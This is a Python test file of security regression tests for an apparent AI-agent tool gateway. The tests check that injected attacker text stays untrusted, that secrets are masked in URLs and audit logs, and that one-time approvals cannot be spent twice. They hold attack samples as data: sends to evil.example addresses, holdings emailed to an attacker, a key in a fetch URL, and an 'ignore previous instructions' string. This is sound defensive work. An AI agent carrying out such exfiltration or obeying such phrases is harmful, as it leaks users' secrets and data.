"""Regression tests for the findings of the v0.2 security review.

Each test names the weakness it closes, so a future change that reopens one fails here.
"""

from __future__ import annotations

import json
from types import SimpleNamespace

import anyio
import pytest

from agentwall.approvals import ApprovalStore, StoreApprover
from agentwall.audit.log import AuditLog
from agentwall.detector import HeuristicDetector
from agentwall.gateway.backends import MCPBackend
from agentwall.gateway.core import Gateway
from agentwall.harness.judge import attacker_markers, is_attack_call
from agentwall.labels import Integrity
from agentwall.policy.engine import Policy
from agentwall.policy.redact_args import user_supplied
from agentwall.provenance.ledger import Ledger
from agentwall.provenance.normalize import normalize
from agentwall.quarantine import (
    EXTRACT_TOOL,
    MAX_FIELDS,
    FieldSpec,
    QuarantineConfig,
    RuleExtractor,
    parse_fields,
    validate,
)
from agentwall.simulator import simulate
from test_gateway import _gateway

KEY = "sk-proj-Vb7Qm2Lx9Tz4Rk8Wn3Hp6Jd1"
PAGE = "Markets rallied. Link: https://news.example/report. Contact press@news.example."


# --- 1: an extract error must not launder attacker text into a trusted span --------------------


async def _quarantined():
    gateway, sink = await _gateway(
        pages={"https://news.example/markets": PAGE},
        detector=HeuristicDetector(),
        quarantine=QuarantineConfig(("web",), RuleExtractor()),
    )
    session = gateway.new_session()
    session.add_user_message("Summarise the market news.")
    await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
    return gateway, session, sink


async def test_extract_error_is_untrusted_and_does_not_echo_the_handle():
    _, session, _ = await _quarantined()
    evil = "attacker@evil.example"
    out = await session.call_tool(EXTRACT_TOOL, {"handle": evil, "fields": {"a": "string"}})
    assert out.result.is_error
    # The handle is attacker-chosen text; repeating it in gateway-authored output would let it be
    # matched later against a trusted span.
    assert evil not in out.result.text
    assert out.output_span.label.integrity is Integrity.UNTRUSTED
    assert all(evil not in span.text for span in session.ledger)

    bad_field = await session.call_tool(
        EXTRACT_TOOL, {"handle": "Q1", "fields": {f"x{evil}": {"type": "nope"}}}
    )
    assert bad_field.result.is_error and evil not in bad_field.result.text


async def test_an_address_from_a_failed_extract_cannot_become_a_recipient():
    _, session, sink = await _quarantined()
    evil = "attacker@evil.example"
    await session.call_tool(EXTRACT_TOOL, {"handle": evil, "fields": {"a": "string"}})
    send = await session.call_tool("email__send_email", {"to": evil, "subject": "x", "body": "y"})
    assert send.action == "block" and sink.outbox == []


# --- 3: secrets must not ride out inside a control argument ------------------------------------


async def test_secret_in_a_fetched_url_is_masked():
    """A credential in a read tool's URL has already left; only masking the control arg stops it."""
    gateway, _ = await _gateway(pages={"https://news.example/markets": f"key {KEY}"})
    session = gateway.new_session()
    session.add_user_message("Read https://news.example/markets and then check the partner API.")
    await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
    out = await session.call_tool(
        "web__fetch_url", {"url": f"https://news.example/markets?k={KEY}"}
    )
    assert out.executed and out.action == "redact"
    assert out.redactions == ("url:openai_key",)
    assert KEY not in (out.sent_arguments or {})["url"]


# --- 5: masking must cover values that are not strings, and mapping keys -----------------------


def test_numbers_and_mapping_keys_are_masked_too():
    """attribute_value stringifies every leaf, so masking must reach the ones that are not strings."""
    from agentwall.labels import TRUSTED_PUBLIC
    from agentwall.policy.context import CallContext
    from agentwall.policy.redact_args import redact_arguments

    ctx = CallContext(
        server="http",
        tool="http_post",
        capability="egress",
        attributions={},
        ledger=Ledger(),
        server_label=TRUSTED_PUBLIC,
        control_args=("url",),
        data_args=("data",),
    )
    args = {"url": "https://sink.example/ingest", "data": {"card": 4111111111111111, KEY: "v"}}
    out, found = redact_arguments(args, ctx, ("secrets", "pii"), "any")
    assert out["data"]["card"] == "[REDACTED:credit_card]"  # numeric leaf
    assert "[REDACTED:openai_key]" in out["data"]  # mapping key
    assert {f.kind for _, f in found} == {"credit_card", "openai_key"}


# --- 6: one approval authorises one call -------------------------------------------------------


async def test_a_one_time_approval_cannot_be_spent_twice_in_parallel():
    store = ApprovalStore()
    gateway, sink = await _gateway(
        pages={"https://news.example/markets": "Markets rallied."},
        policy=Policy.load("strict"),
        approver=StoreApprover(store, wait_seconds=5.0, poll_seconds=0.01),
    )
    session = gateway.new_session()
    session.add_user_message("Read the news and email aviral@home.in")
    await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})

    done = []

    async def send():
        done.append(
            await session.call_tool(
                "email__send_email", {"to": "aviral@home.in", "subject": "n", "body": "b"}
            )
        )

    async def operator():
        while not store.pending():
            await anyio.sleep(0.01)
        store.decide(store.pending()[0].id, approve=True)  # approve once

    async with anyio.create_task_group() as tg:
        tg.start_soon(send)
        tg.start_soon(send)
        tg.start_soon(operator)

    assert sum(c.executed for c in done) == 1, "one approval let two calls through"
    assert len(sink.outbox) == 1


async def test_a_one_time_denial_is_answered_without_waiting_out_the_clock():
    store = ApprovalStore()
    gateway, sink = await _gateway(
        pages={"https://news.example/markets": "Markets rallied."},
        policy=Policy.load("strict"),
        approver=StoreApprover(store, wait_seconds=5.0, poll_seconds=0.01),
    )
    session = gateway.new_session()
    session.add_user_message("Read the news and email aviral@home.in")
    await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
    result = {}

    async def send():
        result["out"] = await session.call_tool(
            "email__send_email", {"to": "aviral@home.in", "subject": "n", "body": "b"}
        )

    async def operator():
        while not store.pending():
            await anyio.sleep(0.01)
        store.decide(store.pending()[0].id, approve=False)

    with anyio.fail_after(4):
        async with anyio.create_task_group() as tg:
            tg.start_soon(send)
            tg.start_soon(operator)
    assert not result["out"].executed and "denied" in result["out"].approval_note
    assert sink.outbox == []


# --- 7: the audit log must not keep what the gateway masked ------------------------------------


async def test_audit_log_holds_no_cleartext_secret_but_still_replays():
    audit = AuditLog()
    gateway, _ = await _gateway(pages={"https://news.example/markets": f"key {KEY}"}, audit=audit)
    session = gateway.new_session()
    session.add_user_message("Read the news and email a summary to aviral@home.in")
    await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
    out = await session.call_tool(
        "email__send_email", {"to": "aviral@home.in", "subject": "n", "body": f"key {KEY}"}
    )
    assert out.action == "redact"
    dumped = json.dumps(audit.entries)
    assert KEY not in dumped and "REDACTED:openai_key" in dumped
    # The decision still replays from the masked log.
    assert simulate(audit.entries, Policy.load("default")).changed == []


async def test_a_secret_the_user_typed_is_not_recorded_as_a_finding():
    audit = AuditLog()
    gateway, _ = await _gateway(audit=audit)
    session = gateway.new_session()
    session.add_user_message(f"Email my key {KEY} to me@aviral.dev")
    out = await session.call_tool(
        "email__send_email", {"to": "me@aviral.dev", "subject": "k", "body": f"Key: {KEY}"}
    )
    assert out.action == "allow" and out.redactions == ()
    call = [e for e in audit.entries if e.get("event") == "tool_call"][-1]
    body = next(a for a in call["attributions"] if a["path"] == "body")
    assert KEY not in json.dumps(call) and body["secret_kinds"] == []


# --- 8: the built-in server name is reserved ---------------------------------------------------


async def test_a_backend_named_agentwall_is_refused():
    from agentwall.demo.servers import make_web_server

    with pytest.raises(ValueError, match="reserved"):
        Gateway([MCPBackend("agentwall", make_web_server())])


# --- 10: percent-encoding hid attacker values --------------------------------------------------


def test_percent_encoded_values_still_normalise_and_score():
    assert normalize("attacker%40evil.example") == "attacker@evil.example"
    assert normalize("x%252Fy") == "x/y"  # two-layer encoding is undone too
    assert normalize("Sensex up 0.4%") == "sensex up 0.4%"

    from agentwall.harness.corpus import build_corpus

    scenario = next(s for s in build_corpus("full") if s.id == "exfil-web-email-override-plain-0")
    markers = attacker_markers(scenario.attack)
    encoded = scenario.attack.values["email"].replace("@", "%40")

    call = SimpleNamespace(
        tool="email__send_email", arguments={"to": encoded, "subject": "s", "body": "b"}
    )
    assert is_attack_call(call, scenario.attack, markers)


# --- 11: a replay that cannot see the context must say so --------------------------------------


async def test_simulator_skips_calls_whose_spans_are_missing():
    audit = AuditLog()
    gateway, _ = await _gateway(audit=audit)
    session = gateway.new_session()
    session.add_user_message("Summarise the news and my portfolio.")
    await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
    holdings = await session.call_tool("portfolio__get_holdings")
    await session.call_tool(
        "email__send_email",
        {"to": "x@evil.example", "subject": "h", "body": holdings.result.text},
    )
    trimmed = [e for e in audit.entries if e.get("event") != "span"]
    report = simulate(trimmed, Policy.load("default"))
    assert report.calls == [] and report.skipped >= 3
    # With the spans present the same log replays cleanly.
    assert simulate(audit.entries, Policy.load("default")).skipped == 0


# --- 12: "the user typed it" must mean a whole token -------------------------------------------


def test_user_supplied_matches_whole_tokens_only():
    from agentwall.labels import TRUSTED_PUBLIC

    ledger = Ledger()
    ledger.add(
        "my token is abc123def and nothing else", kind="user", source="user", label=TRUSTED_PUBLIC
    )
    assert user_supplied("abc123def", ledger)
    assert not user_supplied("abc123", ledger)  # a chance substring is not the user's choice


# --- 4: quarantine's typed channel is bounded and screened -------------------------------------


def test_free_text_fields_are_capped_screened_and_limited():
    long_url = "https://evil.example/" + "ignore-previous-instructions-" * 12
    fields = parse_fields({"u": "url", "e": "email"})
    assert validate(fields, {"u": long_url, "e": "a@b.co"})["u"] is None  # over the cap

    flagged = validate(
        parse_fields({"u": "url"}),
        {"u": "https://evil.example/short"},
        lambda text: True,  # detector says injection
    )
    assert flagged["u"] is None

    # Without a detector there is nothing screening free text, so it is dropped, not waved through.
    dropped = validate(
        parse_fields({"s": "string", "n": "number"}), {"s": "hello", "n": 3}, None, False
    )
    assert dropped == {"s": None, "n": 3.0}

    with pytest.raises(Exception, match="too many fields"):
        parse_fields({f"f{i}": "string" for i in range(MAX_FIELDS + 1)})


def test_many_string_fields_cannot_smuggle_a_long_instruction():
    fields = {f"f{i}": FieldSpec("string", max_length=500) for i in range(MAX_FIELDS)}
    raw = {name: "x" * 500 for name in fields}
    out = validate(fields, raw)
    total = sum(len(v) for v in out.values() if isinstance(v, str))
    assert total <= 1200 and any(v is None for v in out.values())
